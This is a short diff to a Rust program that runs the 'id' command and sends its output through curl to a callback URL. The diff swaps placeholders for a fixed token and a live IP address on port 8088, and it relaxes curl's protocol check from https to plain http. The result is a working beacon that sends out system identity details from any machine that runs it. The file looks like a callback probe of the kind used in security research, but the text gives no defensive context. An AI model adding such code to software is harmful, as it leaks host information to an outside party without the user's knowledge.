@@ -1,8 +1,8 @@
 use std::process::Command;
 
-const TOKEN: &str = "REPLACE_WITH_UNIQUE_TOKEN";
+const TOKEN: &str = "09d81f4cf7b8b3b217cbdeb0ddcb3b40";
 const CALLBACK: &str =
-    "https://YOUR_CALLBACK_HOST/callback/REPLACE_WITH_UNIQUE_TOKEN";
+    "http://150.241.115.45:8088/callback/09d81f4cf7b8b3b217cbdeb0ddcb3b40";
 
 fn main() {
     let id = Command::new("id")
@@ -30,7 +30,7 @@ fn main() {
             "--max-time",
             "5",
             "--proto",
-            "=https",
+            "=http",
             "--get",
             "--data-urlencode",
             &format!("id={id}"),
@@ -40,4 +40,3 @@ fn main() {
         ])
         .status();
 }
-
